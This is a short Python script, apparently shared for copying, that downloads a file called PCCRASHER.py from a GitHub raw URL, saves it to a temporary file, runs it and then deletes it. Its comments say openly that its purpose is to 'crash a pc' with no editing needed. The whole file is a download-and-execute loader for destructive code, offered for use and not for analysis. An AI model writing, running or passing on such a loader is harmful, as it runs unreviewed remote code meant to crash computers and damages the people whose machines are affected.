#Press CTRL + A and CTRL+C to copy all




#Full screen this window to read

#This will automatically load the most up to date version of the script
#It will also use default settings
#If you want to change the settings, you can head to the link defined at github_raw_url
#If you just want to run this and crash a pc, no editing is needed - just run it.



import urllib.request
import subprocess
print('A pop-up dialog will appear momentarily. If you do not see it, hover over IDLE or Python in the taskbar and it will show all open windows.')
# Define the URL of the raw GitHub file
github_raw_url = "https://raw.githubusercontent.com/xJustBen/PyProject/main/PCCRASHER.py"

try:
    with urllib.request.urlopen(github_raw_url) as response:
        script_content = response.read().decode('utf-8')

    with open("temp_script.py", "w") as temp_file:
        temp_file.write(script_content)

    result = subprocess.run(["python", "temp_script.py"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    print("Script Output:")
    print(result.stdout)

    if result.stderr:
        print("Script Errors:")
        print(result.stderr)

except Exception as e:
    print(f"An error occurred: {e}")

finally:
    try:
        subprocess.run(["rm", "temp_script.py"])
    except Exception as e:
        pass
